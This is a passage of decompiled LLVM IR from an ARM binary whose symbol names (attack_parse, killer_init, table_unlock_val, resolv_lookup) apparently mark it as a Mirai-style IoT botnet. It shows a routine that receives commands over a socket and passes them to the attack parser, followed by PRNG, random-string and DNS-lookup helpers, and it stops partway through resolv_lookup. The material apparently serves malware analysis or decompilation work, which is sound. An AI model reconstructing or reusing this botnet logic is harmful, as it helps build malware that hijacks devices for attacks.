  %v3_e260 = load i8*, i8** %stack_var_-42, align 4
  %v4_e260 = ptrtoint i8* %v3_e260 to i32
  %v3_e264 = udiv i32 %v4_e260, 256
  %v1_e268 = mul i32 %v4_e260, 256
  %v4_e26c = and i32 %v1_e268, 65280
  %v5_e26c = or i32 %v4_e26c, %v3_e264
  store i32 %v5_e26c, i32* %ip.global-to-local, align 4
  store i32 %v2_de98, i32* @lr, align 4
  store i32 %v5_e26c, i32* %r2.global-to-local, align 4
  %v2_e27c = load i32, i32* @global_var_222b0.108, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_e284 = inttoptr i32 %v5_e26c to i8*
  store i8* %v6_e284, i8** %stack_var_-42, align 4
  %v6_e288 = call i32 @__libc_recv(i32 %v2_e27c, i32 %v2_e224, i32 %v5_e26c, i32 16384)
  store i32 %v2_de98, i32* %r2.global-to-local, align 4
  %v3_e290 = load i8*, i8** %stack_var_-42, align 4
  %v3_e294 = icmp eq i8* %v3_e290, null
  br i1 %v3_e294, label %dec_label_pc_dd6c, label %dec_label_pc_e29c

dec_label_pc_e29c:                                ; preds = %dec_label_pc_e248
  %v4_e290 = ptrtoint i8* %v3_e290 to i32
  %v5_e2a0 = call i32 @attack_parse(i32* nonnull %stack_var_-1432, i32 %v4_e290, i32 %v2_de98)
  br label %dec_label_pc_dd6c

; uselistorder directives
  uselistorder i8* %v3_e290, { 1, 0 }
  uselistorder i32 %v5_e26c, { 1, 0, 2, 3 }
  uselistorder i32 %v7_e234, { 1, 0 }
  uselistorder i32 %v5_e1f4, { 1, 0, 3, 2 }
  uselistorder i32 %v3_e010, { 1, 3, 2, 0 }
  uselistorder i32 %v4_dfe0, { 1, 0, 2, 3 }
  uselistorder i32 %v4_dfc8, { 1, 0 }
  uselistorder i32 %v2_df6c, { 6, 3, 2, 0, 1, 5, 4 }
  uselistorder i32 %v2_deac, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-1436.1, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_de94, { 1, 0, 2 }
  uselistorder i32 %v5_de60, { 1, 2, 0 }
  uselistorder i32 %v2_ddac, { 2, 1, 0 }
  uselistorder i32 %v1_dd9c, { 1, 2, 0 }
  uselistorder i32 %v1_dd80, { 1, 2, 0 }
  uselistorder i32 %stack_var_-1436.0, { 4, 3, 0, 1, 2 }
  uselistorder i32 %v2_e098, { 1, 0, 2, 3 }
  uselistorder i32 %v2_e07c, { 3, 0, 5, 4, 2, 1 }
  uselistorder i32 %v2_e074, { 1, 0 }
  uselistorder i32 %v2_de98, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v2_dd68, { 1, 0, 2 }
  uselistorder i32 %v2_dc0c, { 0, 12, 1, 13, 2, 11, 3, 10, 4, 5, 9, 8, 6, 14, 7, 15 }
  uselistorder i32 %v2_dbf8, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_db74, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0, 2 }
  uselistorder i32* %stack_var_-152, { 1, 0, 2 }
  uselistorder i32* %stack_var_-48, { 1, 0, 2 }
  uselistorder i8** %stack_var_-42, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 26, 27, 28, 30, 29, 33, 31, 32, 24, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 7, 8, 9, 5, 6, 10, 11 }
  uselistorder i32* @global_var_2242c.97, { 1, 2, 0 }
  uselistorder i8* null, { 0, 2, 1 }
  uselistorder i32 16386, { 1, 2, 0, 3 }
  uselistorder i32 ptrtoint (i8** @global_var_22430.111 to i32), { 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_22430.111 to i8*), { 0, 1, 3, 2 }
  uselistorder i32* @global_var_222ac.88, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9 }
  uselistorder i32* @global_var_222b0.108, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32 (i32)* @watchdog_maintain, { 1, 0 }
  uselistorder i32 (i32)* @killer_init, { 1, 0 }
  uselistorder i32 (i32)* @attack_init, { 1, 0 }
  uselistorder i32 (i32, i32)* @rand_alpha_str, { 2, 1, 0 }
  uselistorder i32* @global_var_222b4.86, { 2, 0, 3, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_d9a0.84 to i32), { 0, 2, 1 }
  uselistorder i32 ptrtoint (i16** @global_var_24f4c.93 to i32), { 0, 1, 3, 2 }
  uselistorder i32 (i32, i32)* @bsd_signal, { 1, 0 }
  uselistorder label %dec_label_pc_e148, { 1, 0 }
  uselistorder label %dec_label_pc_e140, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_dea8, { 2, 1, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %dec_label_pc_ddec, { 2, 0, 1 }
  uselistorder label %dec_label_pc_dddc, { 1, 0 }
  uselistorder label %dec_label_pc_dd6c, { 7, 1, 8, 9, 2, 0, 10, 3, 11, 12, 4, 5, 13, 6, 14 }
  uselistorder label %dec_label_pc_dbcc, { 2, 0, 1 }
}

define i32 @function_e2d0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_e2d0:
  %v0_e2d0 = load i1, i1* @cpsr_c, align 1
  call void @__pseudo_cond_branch(i1 %v0_e2d0, i32 -22311548)
  %v0_e2d8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_e2d8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_e2d0
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_e2d0, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @rand_next() local_unnamed_addr {
entry:
  %v2_e2ec = load i32, i32* @global_var_22434.120, align 4
  %v2_e2f0 = load i32, i32* @global_var_22440.122, align 4
  %v4_e2fc = mul i32 %v2_e2ec, 2048
  %v5_e2fc = xor i32 %v4_e2fc, %v2_e2ec
  store i32 %v5_e2fc, i32* @r3, align 4
  %v4_e300 = udiv i32 %v2_e2f0, 524288
  %v5_e300 = xor i32 %v4_e300, %v2_e2f0
  %v2_e304 = load i32, i32* @global_var_22438.124, align 4
  %v2_e308 = load i32, i32* @global_var_2243c.126, align 4
  %v2_e30c = xor i32 %v5_e300, %v5_e2fc
  %v4_e310 = udiv i32 %v5_e2fc, 256
  %v5_e310 = xor i32 %v2_e30c, %v4_e310
  store i32 %v2_e304, i32* @global_var_22434.120, align 4
  store i32 %v2_e308, i32* @global_var_22438.124, align 4
  store i32 %v2_e2f0, i32* @global_var_2243c.126, align 4
  store i32 %v5_e310, i32* @global_var_22440.122, align 4
  ret i32 %v5_e310

; uselistorder directives
  uselistorder i32 %v2_e2f0, { 2, 1, 0 }
  uselistorder i32 %v2_e2ec, { 1, 0 }
}

define i32 @rand_init(i32 %arg1) local_unnamed_addr {
entry:
  %v2_e348 = call i32 @__GI_time(i32* null)
  store i32 %v2_e348, i32* @global_var_22434.120, align 4
  %v1_e354 = call i32 @__getpid(i32 %v2_e348)
  store i32 %v1_e354, i32* @r0, align 4
  %v0_e35c = call i32 @getppid()
  %v2_e364 = xor i32 %v1_e354, %v0_e35c
  store i32 %v2_e364, i32* @global_var_22438.124, align 4
  %v1_e36c = call i32 @clock(i32 %v2_e364)
  %v2_e370 = load i32, i32* @global_var_22438.124, align 4
  %v2_e37c = xor i32 %v2_e370, %v1_e36c
  store i32 %v2_e37c, i32* @global_var_22440.122, align 4
  store i32 %v1_e36c, i32* @global_var_2243c.126, align 4
  ret i32 %v1_e36c

; uselistorder directives
  uselistorder i32 %v1_e36c, { 1, 2, 0 }
  uselistorder i32 ()* @getppid, { 2, 1, 0 }
  uselistorder i32 (i32)* @__getpid, { 2, 1, 0 }
}

define i32 @rand_alpha_str(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_e3a4 = load i32, i32* @r4, align 4
  %v6_e3a4 = load i32, i32* @r5, align 4
  %v9_e3a4 = load i32, i32* @r6, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  %v1_e3b8 = call i32 @table_unlock_val(i32 33)
  %v3_e3c4 = call i32 @table_retrieve_val(i32 33, i32* null)
  store i32 %v3_e3c4, i32* @r1, align 4
  %v2_e3d0 = bitcast i32* %stack_var_-72 to i8*
  %v3_e3d0 = call i32 @strcpy(i8* %v2_e3d0, i32 %v3_e3c4)
  %v2_e3d4 = icmp eq i32 %arg2, 0
  br i1 %v2_e3d4, label %dec_label_pc_e450, label %dec_label_pc_e3dc

dec_label_pc_e3dc:                                ; preds = %entry
  store i32 ptrtoint (i32* @global_var_22434.120 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22438.124 to i32), i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2243c.126 to i32), i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22440.122 to i32), i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v2_e434 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_e3f0

dec_label_pc_e3f0:                                ; preds = %dec_label_pc_e3f0.dec_label_pc_e3f0_crit_edge, %dec_label_pc_e3dc
  %v1_e414 = phi i32 [ %v1_e414.pre, %dec_label_pc_e3f0.dec_label_pc_e3f0_crit_edge ], [ ptrtoint (i32* @global_var_22434.120 to i32), %dec_label_pc_e3dc ]
  %v2_e3f0 = load i32, i32* @global_var_22440.122, align 4
  store i32 %v2_e3f0, i32* %r2.global-to-local, align 4
  %v2_e3f4 = load i32, i32* @global_var_22434.120, align 4
  %v4_e3f8 = udiv i32 %v2_e3f0, 524288
  %v5_e3f8 = xor i32 %v4_e3f8, %v2_e3f0
  %v4_e3fc = mul i32 %v2_e3f4, 2048
  %v5_e3fc = xor i32 %v4_e3fc, %v2_e3f4
  %v2_e400 = xor i32 %v5_e3f8, %v5_e3fc
  %v2_e404 = load i32, i32* @global_var_22438.124, align 4
  %v2_e408 = load i32, i32* @global_var_2243c.126, align 4
  store i32 %v2_e408, i32* %ip.global-to-local, align 4
  %v4_e40c = udiv i32 %v5_e3fc, 256
  %v5_e40c = xor i32 %v2_e400, %v4_e40c
  store i32 %v5_e40c, i32* @r4, align 4
  %v2_e414 = inttoptr i32 %v1_e414 to i32*
  store i32 %v2_e404, i32* %v2_e414, align 4
  %v0_e418 = load i32, i32* %ip.global-to-local, align 4
  %v1_e418 = load i32, i32* %r8.global-to-local, align 4
  %v2_e418 = inttoptr i32 %v1_e418 to i32*
  store i32 %v0_e418, i32* %v2_e418, align 4
  %v0_e41c = load i32, i32* %r2.global-to-local, align 4
  %v1_e41c = load i32, i32* %r7.global-to-local, align 4
  %v2_e41c = inttoptr i32 %v1_e41c to i32*
  store i32 %v0_e41c, i32* %v2_e41c, align 4
  %v0_e420 = load i32, i32* @r4, align 4
  %v1_e420 = load i32, i32* @r6, align 4
  %v2_e420 = inttoptr i32 %v1_e420 to i32*
  store i32 %v0_e420, i32* %v2_e420, align 4
  %v2_e424 = call i32 @util_strlen(i8* %v2_e3d0)
  %v0_e42c = load i32, i32* @r4, align 4
  %v3_e430 = urem i32 %v0_e42c, %v2_e424
  %v2_e438 = add i32 %v3_e430, %v2_e434
  %v1_e43c = add i32 %v2_e438, -32
  %v2_e43c = inttoptr i32 %v1_e43c to i8*
  %v3_e43c = load i8, i8* %v2_e43c, align 1
  %v2_e440 = load i32, i32* @r5, align 4
  %v3_e440 = load i32, i32* %fp.global-to-local, align 4
  %v4_e440 = add i32 %v3_e440, %v2_e440
  %v5_e440 = inttoptr i32 %v4_e440 to i8*
  store i8 %v3_e43c, i8* %v5_e440, align 1
  %v0_e444 = load i32, i32* @r5, align 4
  %v1_e444 = add i32 %v0_e444, 1
  store i32 %v1_e444, i32* @r5, align 4
  %v1_e448 = load i32, i32* %sb.global-to-local, align 4
  %v9_e448 = icmp eq i32 %v1_e444, %v1_e448
  br i1 %v9_e448, label %dec_label_pc_e450, label %dec_label_pc_e3f0.dec_label_pc_e3f0_crit_edge

dec_label_pc_e3f0.dec_label_pc_e3f0_crit_edge:    ; preds = %dec_label_pc_e3f0
  %v1_e414.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_e3f0

dec_label_pc_e450:                                ; preds = %dec_label_pc_e3f0, %entry
  %v1_e454 = call i32 @table_lock_val(i32 33)
  store i32 %v3_e3a4, i32* @r4, align 4
  store i32 %v6_e3a4, i32* @r5, align 4
  store i32 %v9_e3a4, i32* @r6, align 4
  ret i32 %v1_e454

; uselistorder directives
  uselistorder i32 %v2_e3f4, { 1, 0 }
  uselistorder i32 %v2_e3f0, { 1, 0, 2 }
}

define i32 @rand_str(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_e474 = load i32, i32* %r1.global-to-local, align 4
  %v3_e478 = load i32, i32* @r4, align 4
  store i32 %v3_e478, i32* %stack_var_-28, align 4
  %v0_e47c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_e47c, i32* %r5.global-to-local, align 4
  %tmp16 = icmp slt i32 %v0_e474, 1
  br i1 %tmp16, label %dec_label_pc_e524, label %dec_label_pc_e484

dec_label_pc_e484:                                ; preds = %entry
  store i32 ptrtoint (i32* @global_var_22440.122 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2243c.126 to i32), i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22438.124 to i32), i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22434.120 to i32), i32* %r6.global-to-local, align 4
  %v2_e494 = load i32, i32* @global_var_22440.122, align 4
  store i32 %v2_e494, i32* %lr.global-to-local, align 4
  %v2_e498 = load i32, i32* @global_var_2243c.126, align 4
  store i32 %v2_e498, i32* %r4.global-to-local, align 4
  %v2_e49c = load i32, i32* @global_var_22438.124, align 4
  store i32 %v2_e49c, i32* %r0.global-to-local, align 4
  %v2_e4a0 = load i32, i32* @global_var_22434.120, align 4
  br label %dec_label_pc_e4c4

dec_label_pc_e4a8:                                ; preds = %dec_label_pc_e4e4
  %v1_e4a8 = trunc i32 %v5_e4d4 to i16
  %v3_e4a8 = inttoptr i32 %v9_e4d8 to i16*
  store i16 %v1_e4a8, i16* %v3_e4a8, align 2
  %v4_e4a8 = load i32, i32* %r5.global-to-local, align 4
  %v5_e4a8 = add i32 %v4_e4a8, -2
  store i32 %v5_e4a8, i32* %r5.global-to-local, align 4
  %v0_e4ac.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_e4ac

dec_label_pc_e4ac:                                ; preds = %.thread, %dec_label_pc_e4a8
  %v0_e4ac = phi i32 [ %v9_e4dc, %.thread ], [ %v0_e4ac.pre, %dec_label_pc_e4a8 ]
  %v2_e4a85 = phi i32 [ %v12_e4d8, %.thread ], [ %v5_e4a8, %dec_label_pc_e4a8 ]
  %tmp17 = icmp slt i32 %v0_e4ac, 1
  br i1 %tmp17, label %dec_label_pc_e52c, label %dec_label_pc_e4b8

dec_label_pc_e4b8:                                ; preds = %dec_label_pc_e4ac
  %v0_e4b0 = load i32, i32* %r0.global-to-local, align 4
  %v0_e4b8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_e4b8, i32* %r0.global-to-local, align 4
  %v0_e4bc = load i32, i32* %lr.global-to-local, align 4
  store i32 %v0_e4bc, i32* %r4.global-to-local, align 4
  %v0_e4c0 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_e4c0, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_e4c4

dec_label_pc_e4c4:                                ; preds = %dec_label_pc_e484, %dec_label_pc_e4b8
  %v0_e510 = phi i32 [ %v2_e49c, %dec_label_pc_e484 ], [ %v0_e4b8, %dec_label_pc_e4b8 ]
  %v9_e4d8 = phi i32 [ %v0_e47c, %dec_label_pc_e484 ], [ %v2_e4a85, %dec_label_pc_e4b8 ]
  %v0_e4f0 = phi i32 [ %v0_e474, %dec_label_pc_e484 ], [ %v0_e4ac, %dec_label_pc_e4b8 ]
  %v0_e504 = phi i32 [ %v2_e494, %dec_label_pc_e484 ], [ %v0_e4c0, %dec_label_pc_e4b8 ]
  %v0_e500 = phi i32 [ %v2_e4a0, %dec_label_pc_e484 ], [ %v0_e4b0, %dec_label_pc_e4b8 ]
  %v4_e4c4 = mul i32 %v0_e500, 2048
  %v5_e4c4 = xor i32 %v4_e4c4, %v0_e500
  %v4_e4c8 = udiv i32 %v0_e504, 524288
  %v5_e4c8 = xor i32 %v4_e4c8, %v0_e504
  %v2_e4cc = xor i32 %v5_e4c8, %v5_e4c4
  %v4_e4d4 = udiv i32 %v5_e4c4, 256
  %v5_e4d4 = xor i32 %v2_e4cc, %v4_e4d4
  store i32 %v5_e4d4, i32* %r3.global-to-local, align 4
  %v7_e4d8 = icmp sgt i32 %v0_e4f0, 3
  br i1 %v7_e4d8, label %.thread, label %dec_label_pc_e4e4

.thread:                                          ; preds = %dec_label_pc_e4c4
  %v10_e4d8 = inttoptr i32 %v9_e4d8 to i32*
  store i32 %v5_e4d4, i32* %v10_e4d8, align 4
  %v11_e4d8 = load i32, i32* %r5.global-to-local, align 4
  %v12_e4d8 = add i32 %v11_e4d8, 4
  store i32 %v12_e4d8, i32* %r5.global-to-local, align 4
  %v8_e4dc = load i32, i32* %r1.global-to-local, align 4
  %v9_e4dc = add i32 %v8_e4dc, -4
  store i32 %v9_e4dc, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_e4ac

dec_label_pc_e4e4:                                ; preds = %dec_label_pc_e4c4
  %v7_e4f0 = icmp eq i32 %v0_e4f0, 1
  store i32 %v5_e4d4, i32* %r3.global-to-local, align 4
  %v1_e4f8 = add i32 %v0_e4f0, -2
  store i32 %v1_e4f8, i32* %r1.global-to-local, align 4
  br i1 %v7_e4f0, label %dec_label_pc_e500, label %dec_label_pc_e4a8

dec_label_pc_e500:                                ; preds = %dec_label_pc_e4e4
  store i32 %v5_e4d4, i32* %r3.global-to-local, align 4
  %v1_e510 = load i32, i32* %r6.global-to-local, align 4
  %v2_e510 = inttoptr i32 %v1_e510 to i32*
  store i32 %v0_e510, i32* %v2_e510, align 4
  %v0_e514 = load i32, i32* %r4.global-to-local, align 4
  %v1_e514 = load i32, i32* %r7.global-to-local, align 4
  %v2_e514 = inttoptr i32 %v1_e514 to i32*
  store i32 %v0_e514, i32* %v2_e514, align 4
  %v0_e518 = load i32, i32* %lr.global-to-local, align 4
  %v1_e518 = load i32, i32* %r8.global-to-local, align 4
  %v2_e518 = inttoptr i32 %v1_e518 to i32*
  store i32 %v0_e518, i32* %v2_e518, align 4
  %v0_e51c = load i32, i32* %r3.global-to-local, align 4
  %v1_e51c = load i32, i32* %sl.global-to-local, align 4
  %v2_e51c = inttoptr i32 %v1_e51c to i32*
  store i32 %v0_e51c, i32* %v2_e51c, align 4
  %v0_e520 = load i32, i32* %r3.global-to-local, align 4
  %v1_e520 = trunc i32 %v0_e520 to i8
  %v2_e520 = load i32, i32* %r5.global-to-local, align 4
  %v3_e520 = inttoptr i32 %v2_e520 to i8*
  store i8 %v1_e520, i8* %v3_e520, align 1
  br label %dec_label_pc_e524

dec_label_pc_e524:                                ; preds = %entry, %dec_label_pc_e52c, %dec_label_pc_e500
  %v2_e524 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_e524, i32* @r4, align 4
  %v1_e528 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_e528

dec_label_pc_e52c:                                ; preds = %dec_label_pc_e4ac
  %v0_e52c = load i32, i32* %r3.global-to-local, align 4
  %v1_e52c = load i32, i32* %sl.global-to-local, align 4
  %v2_e52c = inttoptr i32 %v1_e52c to i32*
  store i32 %v0_e52c, i32* %v2_e52c, align 4
  %v0_e530 = load i32, i32* %lr.global-to-local, align 4
  %v1_e530 = load i32, i32* %r8.global-to-local, align 4
  %v2_e530 = inttoptr i32 %v1_e530 to i32*
  store i32 %v0_e530, i32* %v2_e530, align 4
  %v0_e534 = load i32, i32* %r4.global-to-local, align 4
  %v1_e534 = load i32, i32* %r7.global-to-local, align 4
  %v2_e534 = inttoptr i32 %v1_e534 to i32*
  store i32 %v0_e534, i32* %v2_e534, align 4
  %v0_e538 = load i32, i32* %r0.global-to-local, align 4
  %v1_e538 = load i32, i32* %r6.global-to-local, align 4
  %v2_e538 = inttoptr i32 %v1_e538 to i32*
  store i32 %v0_e538, i32* %v2_e538, align 4
  br label %dec_label_pc_e524

; uselistorder directives
  uselistorder i32 %v9_e4dc, { 1, 0 }
  uselistorder i32 %v12_e4d8, { 1, 0 }
  uselistorder i32 %v5_e4d4, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v0_e500, { 1, 0 }
  uselistorder i32 %v0_e504, { 1, 0 }
  uselistorder i32 %v0_e4f0, { 1, 0, 2 }
  uselistorder i32 %v0_e4ac, { 1, 0 }
  uselistorder i32 %v0_e474, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 4, 0, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 4, 0, 1, 2, 3, 6, 5 }
  uselistorder i32* %r1.global-to-local, { 3, 5, 4, 2, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 4, 3, 2, 5, 6, 0, 1 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* @global_var_22434.120, { 2, 3, 5, 1, 0, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_22434.120 to i32), { 1, 0, 2 }
  uselistorder i32* @global_var_22438.124, { 2, 3, 6, 4, 1, 0, 5 }
  uselistorder i32* @global_var_2243c.126, { 2, 3, 5, 1, 0, 4 }
  uselistorder i32* @global_var_22440.122, { 2, 3, 5, 1, 0, 4 }
  uselistorder label %dec_label_pc_e524, { 1, 2, 0 }
  uselistorder label %dec_label_pc_e4c4, { 1, 0 }
}

define i32 @resolv_entries_free(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_e550 = load i32, i32* @r4, align 4
  store i32 %v3_e550, i32* %stack_var_-8, align 4
  %v6_e550 = load i32, i32* @lr, align 4
  %v0_e554 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_e554, i32* @r4, align 4
  %v2_e554 = icmp eq i32 %v0_e554, 0
  br i1 %v2_e554, label %dec_label_pc_e570, label %dec_label_pc_e55c

dec_label_pc_e55c:                                ; preds = %entry
  %v1_e55c = add i32 %v0_e554, 4
  %v2_e55c = inttoptr i32 %v1_e55c to i32*
  %v3_e55c = load i32, i32* %v2_e55c, align 4
  store i32 %v3_e55c, i32* %r0.global-to-local, align 4
  store i32 58728, i32* @lr, align 4
  %v1_e564 = icmp ne i32 %v3_e55c, 0
  call void @__pseudo_cond_branch(i1 %v1_e564, i32 ptrtoint (i32* @global_var_1358c.34 to i32))
  %v0_e568 = load i32, i32* @r4, align 4
  store i32 %v0_e568, i32* @r0, align 4
  %v0_e56c = call i32 @free()
  store i32 %v0_e56c, i32* %r0.global-to-local, align 4
  %v2_e570.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_e570

dec_label_pc_e570:                                ; preds = %entry, %dec_label_pc_e55c
  %v1_e574 = phi i32 [ 0, %entry ], [ %v0_e56c, %dec_label_pc_e55c ]
  %v2_e570 = phi i32 [ %v3_e550, %entry ], [ %v2_e570.pre, %dec_label_pc_e55c ]
  store i32 %v2_e570, i32* @r4, align 4
  store i32 %v6_e550, i32* @lr, align 4
  ret i32 %v1_e574

; uselistorder directives
  uselistorder i32 %v0_e554, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_e570, { 1, 0 }
}

define i32 @resolv_lookup(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp79 = call i16 @__decompiler_undefined_function_3()
  %stack_var_-4280 = alloca i32, align 4
  %stack_var_-4292 = alloca i16, align 2
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-2230 = alloca i32, align 4
  %stack_var_-2244 = alloca i16, align 2
  %stack_var_-2232 = alloca i32, align 4
  %v3_e578 = load i32, i32* @r4, align 4
  %v9_e578 = load i32, i32* @r6, align 4
  %v12_e578 = load i32, i32* @r7, align 4
  %v15_e578 = load i32, i32* @r8, align 4
  %v18_e578 = load i32, i32* @sb, align 4
  %v21_e578 = load i32, i32* @sl, align 4
  %v24_e578 = load i32, i32* @fp, align 4
  %v27_e578 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_e590 = call i32 @calloc(i32 1, i32 8)
  store i32 %v2_e590, i32* @fp, align 4
  %v0_e598 = load i32, i32* @r5, align 4
  store i32 %v0_e598, i32* %r0.global-to-local, align 4
  %v1_e59c = inttoptr i32 %v0_e598 to i8*
  %v2_e59c = call i32 @util_strlen(i8* %v1_e59c)
  %v2_e5a4 = ptrtoint i16* %stack_var_-2244 to i32
  store i32 %v2_e5a4, i32* @sl, align 4
  %v2_e5a8 = ptrtoint i32* %stack_var_-2232 to i32
  store i32 %v2_e5a8, i32* @sb, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_e5b0 = add i32 %v2_e59c, 1
  store i32 %v1_e5b0, i32* %r0.global-to-local, align 4
  %v2_e5b4 = ptrtoint i32* %stack_var_-2230 to i32
  store i32 %v2_e5b4, i32* %r2.global-to-local, align 4
  store i32 %v2_e5a8, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 %v1_e5b0, i32* %r3.global-to-local, align 4
  %v2_e5f0146 = icmp eq i32 %v1_e5b0, 0
  store i1 %v2_e5f0146, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* @lr, align 4
  %v1_e5f8147 = add i32 %v2_e5b4, -1
  store i32 %v1_e5f8147, i32* %r1.global-to-local, align 4
  %tmp116148 = icmp slt i32 %v1_e5b0, 1
  br i1 %tmp116148, label %dec_label_pc_e600, label %dec_label_pc_e5c4

dec_label_pc_e5c4:                                ; preds = %entry, %bb115
  %v0_e5c4151 = phi i32 [ %v1_e5e4, %bb115 ], [ 0, %entry ]
  %v1_e5d0150.off0 = phi i8 [ %extract.t152, %bb115 ], [ 0, %entry ]
  %v2_e604149 = phi i32 [ %v1_e5e8, %bb115 ], [ %v2_e5b4, %entry ]
  %v1_e5c4 = load i32, i32* @r5, align 4
  %v2_e5c4 = add i32 %v1_e5c4, %v0_e5c4151
  %v3_e5c4 = inttoptr i32 %v2_e5c4 to i8*
  %v4_e5c4 = load i8, i8* %v3_e5c4, align 1
  %v6_e5c4 = zext i8 %v4_e5c4 to i32
  store i32 %v6_e5c4, i32* %r3.global-to-local, align 4
  %v2_e5c8 = icmp eq i8 %v4_e5c4, 0
  store i1 %v2_e5c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e5c8, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_e5c4
  %v8_e5cc = icmp eq i8 %v4_e5c4, 46
  store i1 %v8_e5cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e5cc, label %.thread, label %.thread7

.thread:                                          ; preds = %dec_label_pc_e5c4, %bb
  %v3_e5d0 = load i32, i32* %r6.global-to-local, align 4
  %v4_e5d0 = inttoptr i32 %v3_e5d0 to i8*
  store i8 %v1_e5d0150.off0, i8* %v4_e5d0, align 1
  %v0_e5d4.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e5d4.pr, label %.thread9.thread13, label %.thread..thread7_crit_edge

